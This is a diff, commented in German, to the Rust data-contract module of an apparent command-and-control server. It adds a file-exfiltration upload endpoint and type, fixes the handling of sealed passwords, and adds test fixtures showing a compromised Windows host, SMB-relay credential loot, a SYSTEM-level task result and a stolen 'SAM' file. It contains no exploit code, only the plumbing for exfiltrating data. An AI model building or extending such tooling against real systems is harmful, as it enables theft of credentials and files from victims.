@@ -132,9 +132,10 @@ impl Host {
     /// Die Feldnamen des Hosts — die **einzige** Fundstelle.
     ///
     /// Der Key-Set-Pinning-Test vergleicht sie mit der Serialisierung, und
-    /// jede Ansicht, die den Host liest, benutzt sie: das Dashboard baut seine
-    /// Spalten daraus, der Export seine Kopfzeile. Vorher stand die Feldliste
-    /// an drei Stellen — im Vertrag, im Dashboard-JavaScript und im
+    /// das Dashboard baut seine Spalten daraus. Der CSV-Export führt eine
+    /// eigene Liste (`CSV_SPALTEN`, ohne `id`), die ein Test gegen diese
+    /// Feldliste pinnt — sie kann nicht auseinanderlaufen. Vorher stand die
+    /// Feldliste an drei Stellen — im Vertrag, im Dashboard-JavaScript und im
     /// CSV-Export.
     pub const FIELDS: &'static [&'static str] = &[
         "host_id",
@@ -252,6 +253,75 @@ impl Task {
         &["id", "host_id", "command", "status", "result", "created_at"];
 }
 
+/// Endpunkt für Datei-Container: `POST /api/files` (Upload) und
+/// `GET /api/files` (Liste). Ein KXENC-Container traegt genau eine Datei
+/// (Issue #31); der Server dedupliziert je `(host_id, file_id)`.
+pub const PATH_FILES: &str = "/api/files";
+
+/// Upload eines KXENC-Datei-Containers.
+///
+/// Ein Request-Typ und damit lenient — ein neuerer Agent darf ein Feld
+/// ergaenzen, ohne einen aelteren Server zu brechen.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct FileUpload {
+    /// Der Host, auf dem die Datei erbeutet wurde. Muss registriert sein
+    /// (ADR-0004).
+    pub host_id: String,
+    /// Die Datei-Kennung aus dem Container-Footer, hex-kodiert (32 Zeichen).
+    /// Sie steht in der AAD des Containers — der Server dedupliziert mit ihr.
+    pub file_id: String,
+    /// Der Name der Originaldatei (ohne Pfad).
+    pub filename: String,
+    /// Die Groesse der Originaldatei in Byte.
+    pub plain_size: u64,
+    /// Der ganze KXENC-Container, base64-kodiert.
+    pub container: String,
+    /// Das versiegelte Master-Key-Material, mit dem der Container gebaut
+    /// wurde. Der Schluessel reist mit der Datei — wie bei der Beute —,
+    /// damit sie auch nach einem neuen Agent-Lauf lesbar bleibt (Issue #70).
+    ///
+    /// `default`, weil ein aelterer Agent es nicht sendet.
+    #[serde(default)]
+    pub sealed_master: String,
+}
+
+/// Eine Datei, die der Server angenommen hat — die Antwortform.
+///
+/// Streng (`deny_unknown_fields`): der Server erzeugt sie, der Client liest
+/// sie. Die Feldmenge ist mit [`Self::FIELDS`] gepinnt.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct ExfiltratedFile {
+    pub id: String,
+    pub host_id: String,
+    pub file_id: String,
+    pub filename: String,
+    pub plain_size: u64,
+    pub container: String,
+    /// Das versiegelte Material des Master-Keys, mit dem der Container
+    /// gebaut wurde. Leer, wenn der Agent ohne Server-Schluessel lief —
+    /// dann gibt es allerdings keinen Container (Issue #31).
+    #[serde(default)]
+    pub sealed_master: String,
+    pub collected_at: String,
+}
+
+impl ExfiltratedFile {
+    /// Die Feldnamen der Datei — die **einzige** Fundstelle.
+    ///
+    /// Siehe [`Host::FIELDS`].
+    pub const FIELDS: &'static [&'static str] = &[
+        "id",
+        "host_id",
+        "file_id",
+        "filename",
+        "plain_size",
+        "container",
+        "sealed_master",
+        "collected_at",
+    ];
+}
+
 /// Registrierung eines Hosts beim C2-Server.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct RegisterRequest {
@@ -343,14 +413,17 @@ impl SecretUpload {
     /// Secret-Scan wie ein eingebettetes Zugangsdaten aus.
     ///
     /// Das Klartext-Feld wird dabei geleert — siehe [`Self::mit_passwort`].
-    /// Ein **leeres** Siegel loescht den Klartext nicht: ein Agent ohne
-    /// Server-Schluessel meldet die Beute im Klartext, und der Server liefert
-    /// sie genau so wieder aus.
+    /// Ein **leeres** Siegel loescht den Klartext nicht und wird auch nicht
+    /// als Siegel uebernommen: sonst stuenden auf der Leitung beide
+    /// Passwortfelder gefuellt — die Invariante waere verletzt (Issue #69).
     pub fn mit_versiegeltem_passwort(mut self, wert: Option<String>) -> Self {
-        if wert.as_ref().is_some_and(|s| !s.is_empty()) {
-            self.password = String::new();
+        match wert {
+            Some(s) if !s.is_empty() => {
+                self.password = String::new();
+                self.sealed_password = Some(s);
+            }
+            _ => self.sealed_password = None,
         }
-        self.sealed_password = wert;
         self
     }
 }
@@ -474,15 +547,31 @@ mod tests {
         }
         .mit_passwort("hash");
 
-        let zurueck = upload.mit_versiegeltem_passwort(None);
+        let zurueck = upload.clone().mit_versiegeltem_passwort(None);
         assert_eq!(
             zurueck.password, "hash",
             "der Klartext ging beim Auslesen verloren"
         );
         assert!(zurueck.sealed_password.is_none());
+
+        // `Some("")` ist kein Siegel: ein leeres versiegeltes Feld darf den
+        // Klartext nicht loeschen und nicht beide Felder fuellen (Issue #69).
+        let zurueck = upload.mit_versiegeltem_passwort(Some(String::new()));
+        assert_eq!(
+            zurueck.password, "hash",
+            "Some(\"\") hat den Klartext geloescht"
+        );
+        assert!(
+            zurueck.sealed_password.is_none(),
+            "ein leeres Siegel wurde als Siegel uebernommen"
+        );
     }
 
     /// Golden-JSON: die exakte Form, die der C2-Server für einen Host ausliefert.
+    ///
+    /// Der Server serialisiert **alle** Felder, auch die leeren: `sealed_master`
+    /// steht deshalb mit dabei — hier leer, weil der Host ohne Server-Schlüssel
+    /// lief. Ein Test pinnt die Feldmenge der Fixture gegen `Host::FIELDS`.
     const HOST_JSON: &str = r#"{
         "host_id": "10.0.0.5",
         "ip": "10.0.0.5",
@@ -490,14 +579,17 @@ mod tests {
         "os": "Windows",
         "status": "compromised",
         "first_seen": "2026-11-11T00:00:00Z",
-        "last_seen": "2026-11-11T00:05:00Z"
+        "last_seen": "2026-11-11T00:05:00Z",
+        "sealed_master": ""
     }"#;
 
     /// Golden-JSON: die exakte Form, die der C2-Server für ein Secret ausliefert.
     ///
     /// Die Passwortwerte sind synthetische Platzhalter mit Hash-Form, keine
     /// erbeuteten Credentials. Ein echter Hash wäre hier auch ein echtes
-    /// Geheimnis im Repository.
+    /// Geheimnis im Repository. Das Beispiel zeigt Klartextbeute (Agent ohne
+    /// Server-Schlüssel): `sealed_password` und `sealed_master` sind leer, aber
+    /// **vorhanden** — der Server serialisiert sie immer.
     const SECRET_JSON: &str = r#"{
         "id": "6f1c1f0e-0f3a-4a1e-9c3f-2f9f5b2c1d44",
         "host_id": "10.0.0.5",
@@ -506,7 +598,8 @@ mod tests {
         "password": "00000000000000000000000000000000",
         "source": "smb_relay",
         "collected_at": "2026-11-11T00:05:00Z",
-        "sealed_master": "platzhalter-master"
+        "sealed_password": "",
+        "sealed_master": ""
     }"#;
 
     /// Golden-JSON: die exakte Form, die der C2-Server für einen Task ausliefert.
@@ -519,6 +612,20 @@ mod tests {
         "status": "done",
         "result": "nt authority\\system",
         "created_at": "2026-11-11T00:06:00Z"
+    }"#;
+
+    /// Golden-JSON: die exakte Form, die der C2-Server fuer eine Datei
+    /// ausliefert. Der Container ist ein synthetischer Platzhalter — ein
+    /// echter KXENC-Container waere hier kilobyteselang.
+    const FILE_JSON: &str = r#"{
+        "id": "3c9d1e2f-3a4b-4c5d-9e8f-0a1b2c3d4e5f",
+        "host_id": "10.0.0.5",
+        "file_id": "000102030405060708090a0b0c0d0e0f",
+        "filename": "SAM",
+        "plain_size": 31457280,
+        "container": "a3hlbmM=",
+        "sealed_master": "dmVyc2llZ2VsdA==",
+        "collected_at": "2026-11-25T00:00:00Z"
     }"#;
 
     /// Golden-JSON: die Form, die der Agent für eine Registrierung sendet.
@@ -566,6 +673,7 @@ mod tests {
         assert_eq!(host.status, STATUS_COMPROMISED);
         assert_eq!(host.first_seen, "2026-11-11T00:00:00Z");
         assert_eq!(host.last_seen, "2026-11-11T00:05:00Z");
+        assert_eq!(host.sealed_master, "");
     }
 
     #[test]
@@ -579,6 +687,64 @@ mod tests {
         assert_eq!(secret.password, "00000000000000000000000000000000");
         assert_eq!(secret.source, "smb_relay");
         assert_eq!(secret.collected_at, "2026-11-11T00:05:00Z");
+        assert_eq!(secret.sealed_password, "");
+        assert_eq!(secret.sealed_master, "");
+    }
+
+    /// Die Golden-JSON-Fixtures tragen **genau** die Feldmenge, die der Server
+    /// serialisiert — nicht weniger.
+    ///
+    /// Der Key-Set-Pinning-Test beweist: Serialisierung == `FIELDS`. Dieser
+    /// Test beweist: Fixture == `FIELDS`. Zusammen: die Fixture ist die exakte
+    /// Serverform. Vorher ließen die Fixtures `sealed_master` und
+    /// `sealed_password` weg und behaupteten trotzdem, die exakte Form zu sein.
+    #[test]
+    fn golden_fixtures_match_the_pinned_field_sets() {
+        fn fixture_keys(json: &str) -> BTreeSet<String> {
+            serde_json::from_str::<serde_json::Value>(json)
+                .expect("Fixture ist JSON")
+                .as_object()
+                .expect("Fixture ist ein Objekt")
+                .keys()
+                .cloned()
+                .collect()
+        }
+        let felder = |fields: &[&str]| -> BTreeSet<String> {
+            fields.iter().map(|f| f.to_string()).collect()
+        };
+        assert_eq!(
+            fixture_keys(HOST_JSON),
+            felder(Host::FIELDS),
+            "die Host-Fixture weicht von der Serverform ab"
+        );
+        assert_eq!(
+            fixture_keys(SECRET_JSON),
+            felder(ExfiltratedSecret::FIELDS),
+            "die Secret-Fixture weicht von der Serverform ab"
+        );
+        assert_eq!(
+            fixture_keys(TASK_JSON),
+            felder(Task::FIELDS),
+            "die Task-Fixture weicht von der Serverform ab"
+        );
+        assert_eq!(
+            fixture_keys(FILE_JSON),
+            felder(ExfiltratedFile::FIELDS),
+            "die Datei-Fixture weicht von der Serverform ab"
+        );
+    }
+
+    /// Die Datei-Fixture deserialisiert in den Vertragstyp — Feld fuer Feld.
+    #[test]
+    fn file_deserializes_from_server_json() {
+        let file: ExfiltratedFile =
+            serde_json::from_str(FILE_JSON).expect("Datei-JSON deserialisierbar");
+        assert_eq!(file.host_id, "10.0.0.5");
+        assert_eq!(file.file_id, "000102030405060708090a0b0c0d0e0f");
+        assert_eq!(file.filename, "SAM");
+        assert_eq!(file.plain_size, 31457280);
+        assert_eq!(file.container, "a3hlbmM=");
+        assert_eq!(file.collected_at, "2026-11-25T00:00:00Z");
     }
 
     #[test]
@@ -759,6 +925,18 @@ mod tests {
             created_at: "c".into(),
         };
         felder_sind_gepinnt(Task::FIELDS, &task);
+
+        let file = ExfiltratedFile {
+            id: "i".into(),
+            host_id: "h".into(),
+            file_id: "f".into(),
+            filename: "n".into(),
+            plain_size: 1,
+            container: "c".into(),
+            sealed_master: "s".into(),
+            collected_at: "c".into(),
+        };
+        felder_sind_gepinnt(ExfiltratedFile::FIELDS, &file);
     }
 
     /// Der Strictness-Nachweis: Antworttypen lehnen unbekannte Felder ab.
